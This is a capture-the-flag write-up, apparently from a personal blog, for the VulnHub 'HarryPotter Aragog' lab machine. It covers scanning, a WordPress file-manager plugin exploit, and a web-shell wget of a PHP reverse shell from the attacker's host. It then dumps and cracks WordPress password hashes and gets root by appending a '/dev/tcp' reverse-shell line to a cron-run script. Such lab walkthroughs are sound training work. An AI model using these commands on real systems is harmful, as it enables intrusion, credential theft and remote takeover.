---
title: HarryPotter-Aragog - Writeup
author: Elman Alizadeh
date: 2022-05-21 15:00:00 +0800
categories: [ctf, VulnHub]
tags: [vulnhub, harrypotter, aragog]
---

Today we will take a look at Vulnhub: Aragog. My goal in sharing this writeup is to show you the way if you are in trouble. Please try to understand each step and take notes.

![Desktop View]({{ "/assets/img/vuln-harry-aragog/1.jpeg" | relative_url }})

## Network scan

Command: sudo nmap -p- -sV -sC -oN nmap/open — open 192.168.0.112

```console
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 48:df:48:37:25:94:c4:74:6b:2c:62:73:bf:b4:9f:a9 (RSA)
|   256 1e:34:18:17:5e:17:95:8f:70:2f:80:a6:d5:b4:17:3e (ECDSA)
|_  256 3e:79:5f:55:55:3b:12:75:96:b4:3e:e3:83:7a:54:94 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 3C:A0:67:C5:35:33 (Liteon Technology)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Gobuster

Command: gobuster dir -u http://192.168.0.112 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

```console
/blog (Status: 301) [Size: 313] [ → http://192.168.0.112/blog/]
/javascript (Status: 301) [Size: 319] [ → http://192.168.0.112/javascript/]
```

## Wordpress

Url- http://192.168.0.112/blog/

![Desktop View]({{ "/assets/img/vuln-harry-aragog/1.png" | relative_url }})

## Wpscan

Command: wpscan — url http://192.168.0.112/blog/ — enumerate ap — plugins-detection aggressive — plugins-version-detection aggressive

![Desktop View]({{ "/assets/img/vuln-harry-aragog/2.png" | relative_url }})

## Exploit

[Exploit](https://github.com/RandomRobbieBF/wp-file-manager)

Command: git clone https://github.com/RandomRobbieBF/wp-file-manager.git

Command: pip3 install -r requirements.txt

Command: python3 wp-file-manager.py -u http://192.168.0.112/blog/

## Reverse shell

Let’s use a php file to get the reverse shell. Let’s change and upload the ip address

[Reverse-shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

Now type this on your machine

Command: python3 -m http.server 80

Enter this in the url

Url: http://192.168.0.112/blog//wp-content/plugins/wp-file-manager/lib/files/cmd.php?cmd=wget%20http://192.168.0.107/php-reverse-shell.php

Your machine

Command: nc -nvlp 1234

Url: http://192.168.0.112/blog//wp-content/plugins/wp-file-manager/lib/files/php-reverse-shell.php

After logging in

Command: script /dev/null -c bash

Command: export TERM=xterm

Ctrl+z

Command: stty raw -echo ; fg

Command: reset

## Linpeas

[Linpeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)

Your machine

Command: python3 -m http.server 80

Target machine

Command: wget http://192.168.0.107/linpeas.sh

Command: chmod +x linpeas.sh

Command: ./linpeas.sh

![Desktop View]({{ "/assets/img/vuln-harry-aragog/3.png" | relative_url }})

## Mysql

Command: mysql -u root -h localhost -p

Command: show databases;

Command: use wordpress;

Command: show tables;

Command: select * from wp_users;

![Desktop View]({{ "/assets/img/vuln-harry-aragog/4.png" | relative_url }})

## hagrid98

### John

Command: nano hash

Paste the hash here.

Command: john hash — wordlist=/usr/share/wordlists/rockyou.txt

```console
Created directory: /home/al1z4deh/.john
Using default input encoding: UTF-8
Loaded 1 password hash (phpass [phpass ($P$ or $H$) 128/128 AVX 4x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password123      (?)     
1g 0:00:00:00 DONE (2022-05-21 14:22) 2.083g/s 3200p/s 3200c/s 3200C/s teacher..mexico1
Use the "--show --format=phpass" options to display all of the cracked passwords reliably
Session completed.
```
Command: su hagrid98

![Desktop View]({{ "/assets/img/vuln-harry-aragog/1.gif" | relative_url }})

## Root

[pspy64](https://github.com/DominicBreuker/pspy)

Command: wget http://192.168.0.107/pspy64

Command: chmod +x pspy64

Command: ./pspy64

![Desktop View]({{ "/assets/img/vuln-harry-aragog/5.png" | relative_url }})

Command: echo “bash -i >& /dev/tcp/192.168.0.107/4242 0>&1” >> /opt/.backup.sh

![Desktop View]({{ "/assets/img/vuln-harry-aragog/6.png" | relative_url }})

### And now we are the root

![Desktop View]({{ "/assets/img/vuln-harry-aragog/2.gif" | relative_url }})

“If you have any questions or comments, please do not hesitate to write. Have a good days”











